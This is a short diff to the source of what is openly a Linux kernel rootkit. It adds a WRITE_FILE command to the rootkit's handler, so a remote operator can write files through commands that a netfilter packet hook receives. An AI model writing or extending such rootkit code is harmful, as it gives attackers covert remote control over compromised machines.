@@ -64,6 +64,12 @@ void rootkit_handler(struct work_struct* work) {
                 send_response("rootkit: random is on\n", args);
             }
             break;
+        
+        case WRITE_FILE:
+            DEBUG_PUTS("rootkit: write command \n");
+            write_file_command(args);
+            break;
+
 
 
         default:
@@ -79,7 +85,6 @@ void rootkit_handler(struct work_struct* work) {
 }
 
     
-
 
 unsigned int packet_reciever(void *priv, struct sk_buff *skb, const struct nf_hook_state *state)
 {
